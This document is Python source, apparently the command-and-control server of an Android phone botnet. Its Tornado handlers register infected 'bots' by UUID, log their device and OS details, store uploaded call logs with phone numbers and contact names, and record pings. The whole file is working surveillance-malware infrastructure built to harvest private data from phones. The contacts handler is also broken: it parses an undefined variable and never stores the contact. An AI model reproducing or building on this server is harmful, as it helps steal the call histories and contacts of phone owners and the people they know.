'''
Created on Mar 15, 2012

@author: moloch

    Copyright [2012] [Redacted Labs]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
'''


import json
import logging

from models import PhoneBot, CallInfo
from datetime import datetime
from handlers.BaseHandlers import BotBaseHandler
from tornado.web import RequestHandler
from libs.SecurityDecorators import bots

class BotHelloHandler(BotBaseHandler):

    @bots
    def get(self, *args, **kwargs):
        ''' Bots come here and say hello '''
        bot = PhoneBot.by_uuid(self.request.headers['Uuid'])
        if bot == None:
            bot = PhoneBot(uuid = self.request.headers['Uuid'])
            self.dbsession.add(bot)
            self.dbsession.flush()
            self.write("Welcome to the horde")
        else:
            self.write("Pink evil robots")
        self.finish()

class BotVersionHandler(BotBaseHandler):

    @bots
    def post(self, *args, **kwargs):
        ''' Collects version information '''
        try:
            # Prbly need to refactor this but it's more of a PoC
            self.bot.os_version = self.get_argument("os_version").encode('utf-8', 'ignore')
            self.bot.build_version = self.get_argument("build_version").encode('utf-8', 'ignore')
            self.bot.sdk_version = self.get_argument("sdk_version").encode('utf-8', 'ignore')
            self.bot.release_version = self.get_argument("release_version").encode('utf-8', 'ignore')
            self.bot.codename = self.get_argument("codename").encode('utf-8', 'ignore')
            self.bot.device = self.get_argument("device").encode('utf-8', 'ignore')
            self.bot.model = self.get_argument("model").encode('utf-8', 'ignore')
            self.bot.product = self.get_argument("product").encode('utf-8', 'ignore')
        except:
            self.write("error")
            self.finish()
            return
        self.dbsession.add(self.bot)
        self.dbsession.flush()
        self.write("ok")
        self.finish()

class BotCallsHandler(BotBaseHandler):

    @bots
    def post(self, *args, **kwargs):
        #try:
        jsonCalls = self.get_argument("jsonCalls")
        calls = json.loads(jsonCalls)
        for key in calls.keys():
            call = json.loads(calls[key])
            logging.info("Got phone call info: %s" % call)
            phone_call = CallInfo(
                    phone_bot_id = self.bot.id,
                    call_type = call['callType'],
                    number_type = call['numberType'],
                    phone_number = call['phoneNumber'],
                    contact_name = call['contactName'],
            )
            self.dbsession.add(phone_call)
        #except:
        #    self.write("error")
        #    self.finish()
        #    return
        self.write("ok")
        self.finish()

class BotContactsHandler(BotBaseHandler):

    @bots
    def post(self, *args, **kwargs):
        try:
            jsonContact = self.get_argument("jsonContact")
        except:
            self.write("Error: Missing parameter")
            self.finish()
            return
        contact = json.loads(calls[key])
        self.write("ok")
        self.finish()

class BotPingHandler(BotBaseHandler):

    @bots
    def get(self, *args, **kwargs):
        ''' Updates the last_seen '''
        self.bot.last_seen = datetime.now()
        self.dbsession.add(self.bot)
        self.dbsession.flush()


